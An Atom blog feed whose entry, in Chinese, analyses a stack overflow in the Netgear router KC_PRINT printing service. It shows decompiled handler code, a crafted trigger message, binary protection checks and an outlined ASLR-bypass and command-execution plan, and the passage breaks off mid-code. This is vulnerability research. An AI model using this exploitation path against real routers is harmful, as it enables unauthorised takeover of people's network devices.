<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Swing&#39;Blog 浮生若梦</title>
  
  <subtitle>努力是为了 站在万人中央 成为别人的光</subtitle>
  <link href="https://bestwing.me/atom.xml" rel="self"/>
  
  <link href="https://bestwing.me/"/>
  <updated>2022-09-08T06:53:49.278Z</updated>
  <id>https://bestwing.me/</id>
  
  <author>
    <name>Swing</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析</title>
    <link href="https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html"/>
    <id>https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html</id>
    <published>2022-09-08T08:06:00.000Z</published>
    <updated>2022-09-08T06:53:49.278Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天 sectoday 推了一个关于 <code>NCC 研究员参加 Pwn2Own Austin 2021 比赛攻破路由器、NAS、打印机的技术细节分享</code> 的推送。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e66939850217aae2c222c419224b1d80-7753dc.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e66939850217aae2c222c419224b1d80-7753dc.png"></a></p><p>其中有一个篇章是讲 Netgear  R6700 Router 的， 恰好我上上篇分享的文章 <a href="https://bestwing.me/PSV-2020-0437-Buffer-Overflow-on-Some-Netgear-outers.html">PSV-2020-0437:Buffer-Overflow-on-Some-Netgear-Routers</a> 所使用的路由器型号以及固件版本也在该漏洞影响范围之内。因此打算分析这个漏洞，并自己写一下这个漏洞的 exploit 。</p><p>注：</p><p>分析以及利用的路由器型号为： R6400v2 ， 固件版本为：V1.0.4.102_10.0.75</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>通过 slide 可以得知， nccgroup 所发现的漏洞在 <code>KC_PRINT</code>  这个程序里，所攻击端口为 <code>631</code> 端口。 根据我浅薄的知识，第一反映这是一个和 IPP (Internet Printing Protocol，缩写IPP, 是一个用于通过互联网打印文件的标准网络协议) 有关的程序。 在后面的进一步分析的过程中，确实验证了我的猜想。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-20a0f61dacf5f6c238e2e5917b83659f-4734c8.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-20a0f61dacf5f6c238e2e5917b83659f-4734c8.png"></a></p><p><code>KC_PRINT</code> 使用不同的线程来处理不同的功能， </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-1d0be4ee778833f6e89bf8f2b9769be9-750d1f.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-1d0be4ee778833f6e89bf8f2b9769be9-750d1f.png"></a></p><p>而该漏洞是发生在 <code>ipp_server</code> 线程里面的。 其大致入口代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( setsockopt(fd, <span class="number">1</span>, <span class="number">2</span>, &amp;optval, <span class="number">4u</span>) &lt; <span class="number">0</span> )</span><br><span class="line"> &#123;</span><br><span class="line">   perror(<span class="string">&quot;ipp_server: setsockopt SO_REUSEADDR failed&quot;</span>);</span><br><span class="line">   close(fd);</span><br><span class="line">   pthread_attr_destroy(&amp;attr);</span><br><span class="line">   pthread_exit(<span class="number">0</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> s.sa_family = <span class="number">2</span>;</span><br><span class="line"> *(_DWORD *)&amp;s.sa_data[<span class="number">2</span>] = htonl(<span class="number">0</span>);</span><br><span class="line"> *(_WORD *)s.sa_data = htons(<span class="number">631u</span>); </span><br><span class="line"> <span class="keyword">if</span> ( bind(fd, &amp;s, <span class="number">0x10</span>u) &lt; <span class="number">0</span> ) <span class="comment">// 在 631 端口监听</span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"> listen(fd, <span class="number">128</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ( flag )</span><br><span class="line"> &#123;</span><br><span class="line">   newfd = accept(fd, &amp;addr, &amp;addr_len);</span><br><span class="line">   <span class="keyword">if</span> ( newfd &gt;= <span class="number">0</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     sub_A0FC(<span class="number">1</span>);</span><br><span class="line">     v1[<span class="number">0</span>] = <span class="number">60</span>;</span><br><span class="line">     v1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">if</span> ( setsockopt(newfd, <span class="number">1</span>, <span class="number">20</span>, v1, <span class="number">8u</span>) &lt; <span class="number">0</span> )</span><br><span class="line">       perror(<span class="string">&quot;ipp_server: setsockopt SO_RCVTIMEO failed&quot;</span>);</span><br><span class="line">     Fd = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">     <span class="keyword">if</span> ( Fd )</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="built_in">memset</span>(Fd, <span class="number">0</span>, <span class="number">8u</span>);</span><br><span class="line">       *Fd = newfd;</span><br><span class="line">       pthread_mutex_lock(&amp;stru_18B40);</span><br><span class="line">       v6 = sub_16068();</span><br><span class="line">       <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">       &#123;</span><br><span class="line">...</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span> ( pthread_create(&amp;dword_18740[v6], &amp;attr, do_ipp_http_thread, Fd) )</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>然后会进入到  <code>do_ipp_http_thread</code> 函数里， 该函数会进一步调用一个 <code>do_http</code> 的函数。 该函数用来处理对应的 IPP 协议的 HTTP 请求。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">n = recv_n(fd, buf, <span class="number">1024</span>);</span><br><span class="line"><span class="keyword">if</span> ( n &lt;= <span class="number">0</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strstr</span>(buf, <span class="string">&quot;100-continue&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">HTTP_INPUT = <span class="built_in">strstr</span>(buf, <span class="string">&quot;POST /USB&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !HTTP_INPUT )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">HTTP_INPUT += <span class="number">9</span>;</span><br><span class="line">v18 = <span class="built_in">strstr</span>(HTTP_INPUT, <span class="string">&quot;_LQ&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v18 )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">v13 = *v18;</span><br><span class="line">*v18 = <span class="number">0</span>;</span><br><span class="line">usblp_index = atoi(HTTP_INPUT);</span><br><span class="line">*v18 = v13;</span><br><span class="line"><span class="keyword">if</span> ( usblp_index &gt; <span class="number">10</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> ( !is_printer_connected(usblp_index) )     <span class="comment">// 检查是否有打印机设备挂载</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">v22[<span class="number">1</span>] = usblp_index;</span><br><span class="line">HTTP_INPUT = <span class="built_in">strstr</span>(buf, <span class="string">&quot;Content-Length: &quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !HTTP_INPUT )</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">HTTP_INPUT += <span class="number">16</span>;</span><br><span class="line">v18 = <span class="built_in">strstr</span>(HTTP_INPUT, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v18 )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">v13 = *v18;</span><br><span class="line">*v18 = <span class="number">0</span>;</span><br><span class="line">content_len = atoi(HTTP_INPUT);</span><br><span class="line">*v18 = v13;</span><br><span class="line"><span class="built_in">memset</span>(recv_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(recv_buf));</span><br><span class="line">n = recv(fd, recv_buf, <span class="number">8u</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( n != <span class="number">8</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> ( (recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">2</span>) &amp;&amp; (recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">6</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v14 = do_airippWithContentLength(v22, content_len, recv_buf);</span><br><span class="line">  <span class="keyword">if</span> ( v14 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先  <code>  n = recv_n(fd, buf, 1024);</code>  接收 1024 的消息，这一部分消息以  <code>\r\n</code> 作为结束标识， 然后会取出 <code>Content-Length: </code> 的值作为  <code>content_len</code> 传入 <code>do_airippWithContentLength</code> 函数中。</p><p>在调用 <code>do_airippWithContentLength</code>  函数之前， 还会读取一个 8 字节长度的消息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(recv_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(recv_buf));</span><br><span class="line">n = recv(fd, recv_buf, <span class="number">8u</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>该 8 字节长度的消息有一定的格式， 当满足 <code>(recv_buf[2] || recv_buf[3] != 2) &amp;&amp; (recv_buf[2] || recv_buf[3] != 6)</code> 条件的时候才会调用 <code>do_airippWithContentLength</code> 函数。</p><p>且进入到 <code>do_airippWithContentLength </code>函数后， 会根据这个 8 个字节长度的消息， 来决定进一步调用哪个函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">do_airippWithContentLength</span><span class="params">(<span class="keyword">int</span> *a1, <span class="keyword">size_t</span> content_len, <span class="keyword">const</span> <span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *recv_buf; <span class="comment">// [sp+18h] [bp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [sp+1Ch] [bp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> Jobs; <span class="comment">// [sp+24h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = *a1;</span><br><span class="line">  recv_buf = <span class="built_in">malloc</span>(content_len);</span><br><span class="line">  <span class="keyword">if</span> ( !recv_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">memcpy</span>(recv_buf, buf, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( toRead(v8, (recv_buf + <span class="number">8</span>), content_len - <span class="number">8</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">11</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">8</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">9</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">10</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">5</span> )</span><br><span class="line">                Jobs = sub_D0C8(a1, recv_buf);</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                Jobs = Response_Create_Job(a1, recv_buf, content_len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              Jobs = Response_Get_Jobs(a1, recv_buf, content_len);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            Jobs = Response_Get_Job_Attributes(a1, recv_buf, content_len);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Client %d: Cancel-Job\n&quot;</span>, v8);</span><br><span class="line">          Jobs = sub_10EA0(a1, recv_buf);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>例如此处， 如果我们想调用 <code>Response_Get_Jobs</code> 函数， 我们就得进一步满足 <code> recv_buf[2] || recv_buf[3] == 10</code>  的条件， 才能进到 <code>Response_Get_Jobs</code> 函数里。因此我们可以构造如下的消息：</p><p><code>b&#39;\x00\x00\x00\x0a\x00\x00\x99\x99&#39;</code>  让其满足下标为 3 的时候 为 <code>10</code>  即可。 </p><p>另外， 在 <code>do_http</code> 函数中有一个 <code>  if ( !is_printer_connected(usblp_index) )     // 检查是否有打印机设备挂载</code> 的判断，该函数会读取 <code>/proc/printer_status</code> 的内容来判断是否有打印机挂载。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( printer_status )</span><br><span class="line">&#123;</span><br><span class="line">  fd = open(<span class="string">&quot;/proc/printer_status&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(printer_status, <span class="number">0</span>, <span class="number">0x400</span>u);</span><br><span class="line">    v7 = read(fd, printer_status, <span class="number">0x400</span>u);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(printer_status + v7) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">      <span class="built_in">snprintf</span>(s, <span class="number">0x10</span>u, <span class="string">&quot;usblp%d&quot;</span>, usblp_index - <span class="number">1</span>);</span><br><span class="line">      v7 = <span class="built_in">strstr</span>(printer_status, s) != <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(printer_status);</span><br><span class="line">      printer_status = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里我没有挂载打印机，因此我通过 gdb 来绕过这个判断。</p><p>此时已经进到 <code>do_airippWithContentLength</code> 函数，  该函数会进一步根据 <code>content-len - 8</code>  读取后续的更多消息内容。而这个 <code>content-len</code>  是没有进行长度检查的，这里以 <code>Response_Get_Jobs</code> 函数为例， 来做进一步的分析。</p><p>在 <code>Response_Get_Jobs</code> 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">flag1 = <span class="number">0</span>;</span><br><span class="line"> prefix_size = <span class="number">0x4A</span>;</span><br><span class="line"> prefix_ptr = <span class="built_in">malloc</span>(<span class="number">0x4A</span>u);</span><br><span class="line"> <span class="keyword">if</span> ( !prefix_ptr )</span><br><span class="line"> &#123;</span><br><span class="line">   perror(<span class="string">&quot;Response_Get_Jobs: malloc xx&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">memset</span>(prefix_ptr, <span class="number">0</span>, prefix_size);</span><br><span class="line"> cnt = memcpy_n(prefix_ptr, total, &amp;recv_buf[offset], <span class="number">2u</span>);</span><br><span class="line"> total += cnt;</span><br><span class="line"> <span class="keyword">if</span> ( *recv_buf == <span class="number">1</span> &amp;&amp; !recv_buf[<span class="number">1</span>] )</span><br><span class="line">   flag1 = <span class="number">1</span>;</span><br><span class="line"> offset += <span class="number">2</span>;</span><br><span class="line"> *(prefix_ptr + total++) = <span class="number">0</span>;</span><br><span class="line"> *(prefix_ptr + total++) = <span class="number">0</span>;</span><br><span class="line"> offset += <span class="number">2</span>;</span><br><span class="line"> total += memcpy_n(prefix_ptr, total, &amp;recv_buf[offset], <span class="number">4u</span>);</span><br><span class="line"> offset += <span class="number">4</span>;</span><br><span class="line"> v12 = <span class="number">66</span>;</span><br><span class="line"> cnt = memcpy_n(prefix_ptr, total, &amp;unk_1823C, <span class="number">0x42</span>u);</span><br><span class="line"> total += cnt;</span><br><span class="line"> ++offset;                                     <span class="comment">// offest == 09</span></span><br><span class="line"> <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line"> <span class="built_in">memset</span>(buf_2048, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf_2048));</span><br><span class="line"> buf_2048[subffix_offset++] = <span class="number">5</span>;</span><br><span class="line"> <span class="keyword">if</span> ( !flag1 )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">while</span> ( recv_buf[offset] != <span class="number">3</span> &amp;&amp; offset &lt;= content_len )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> ( recv_buf[offset] == <span class="number">0x44</span> &amp;&amp; !flag2 )</span><br><span class="line">     &#123;</span><br><span class="line">       flag2 = <span class="number">1</span>;</span><br><span class="line">       buf_2048[subffix_offset++] = <span class="number">68</span>;</span><br><span class="line">       copy_len = (recv_buf[offset + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + recv_buf[offset + <span class="number">2</span>];</span><br><span class="line">       cnt = memcpy_n(buf_2048, subffix_offset, &amp;recv_buf[offset + <span class="number">1</span>], copy_len + <span class="number">2</span>);</span><br><span class="line">       subffix_offset += cnt;</span><br><span class="line">     &#125;</span><br><span class="line">     ++offset;                                 <span class="comment">// offset=10</span></span><br><span class="line">     copy_len = (recv_buf[offset] &lt;&lt; <span class="number">8</span>) + recv_buf[offset + <span class="number">1</span>];</span><br><span class="line">     offset += <span class="number">2</span> + copy_len;                   <span class="comment">// offset 12</span></span><br><span class="line">     copy_len = (recv_buf[offset] &lt;&lt; <span class="number">8</span>) + recv_buf[offset + <span class="number">1</span>];</span><br><span class="line">     offset += <span class="number">2</span>;                              <span class="comment">// offset 14</span></span><br><span class="line">     <span class="keyword">if</span> ( flag2 )</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="built_in">memset</span>(command, <span class="number">0</span>, <span class="keyword">sizeof</span>(command));</span><br><span class="line">       <span class="built_in">memcpy</span>(command, &amp;recv_buf[offset], copy_len);</span><br><span class="line">       <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-media-sheets-completed&quot;</span>) )</span><br></pre></td></tr></table></figure><p>存在一个缓冲区溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( flag2 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(command, <span class="number">0</span>, <span class="keyword">sizeof</span>(command));</span><br><span class="line">  <span class="built_in">memcpy</span>(command, &amp;recv_buf[offset], copy_len);</span><br></pre></td></tr></table></figure><p>此处的 <code>copy_len</code>  是完全可控的， 且 <code>buf_2048</code>   在栈上， 我们只需让 <code>flag1</code>  不等于1 ， <code>flag2</code> 等于 1 ，就能进入到这个分支， 即满足  <code> *recv_buf == 1 &amp;&amp; !recv_buf[1]</code> 且 <code> recv_buf[offset] == 0x44</code> 条件即可。</p><h2 id="利用编写"><a href="#利用编写" class="headerlink" title="利用编写"></a>利用编写</h2><p>该程序保护都没有开启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/workhub/Dropbox/Attachments/IoT and BaseBand/Router/Netgear/R6400v2/fs/squashfs-root/usr/bin/KC_PRINT&#x27;</span></span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>既没有 <code>canary</code>  也没有 <code>PIE</code> ， 这极大的方便了我们的漏洞利用。  </p><p>系统随机化开启情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure><p><code>ASLR</code> 等级为 1， 即栈和共享库是完全随机的， 但是堆的分配不随机。</p><p>我们的目的是通过这个栈溢出漏洞， 来达到任意命令执行的目的。我们检索这个程序，发现程序里并没有现成的 <code>system</code> 或者 <code>popen</code> 函数，因此 <code>ret2system</code> 的方法并不能直接使用， 因此我们需要绕过随机化，需要泄漏 <code>uclibc</code> 中的 <code>system</code> 地址， 因此首先需要一个信息泄漏的方法，来 leak <code>uclibc </code> 的加载基址。</p><h3 id="Bypass-ASLR"><a href="#Bypass-ASLR" class="headerlink" title="Bypass ASLR"></a>Bypass ASLR</h3><p>其实一般这种思路， 我们可以通过 ROP ， 调用 <code>write</code> 等函数读取  <code>got</code> 表中的值来做 <code>uclibc </code>的地址。 但是这个方法我们可能需要知道我们当前链接的 <code>fd</code> 。如果不知道 <code>fd</code> ， 我们可能需要爆破这个， 但由于这个程序是多线程而不是父子进程的形式， 如果失败可能会造成 crash。 </p><p>进一步分析函数， 以及阅读 slide  ，我们发现程序中有一个可以做任意地址读写的方法。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-763f460331a41355beb24dcb1b383c47-159298.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-763f460331a41355beb24dcb1b383c47-159298.png"></a></p><p>我们可以通过栈溢出， 来覆盖 <code>prefix_ptr</code>  和 <code>prefix_size </code> 通过控制这两个变量，我们就可以通 <code>write_ipp_response</code>  将我们想读取的内容发送回来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> command[<span class="number">64</span>]; <span class="comment">// [sp+24h] [bp-1090h] BYREF</span></span><br><span class="line"><span class="keyword">char</span> buf_2048[<span class="number">2048</span>]; <span class="comment">// [sp+64h] [bp-1050h] BYREF</span></span><br><span class="line"><span class="keyword">char</span> v9[<span class="number">2048</span>]; <span class="comment">// [sp+864h] [bp-850h] BYREF</span></span><br><span class="line"><span 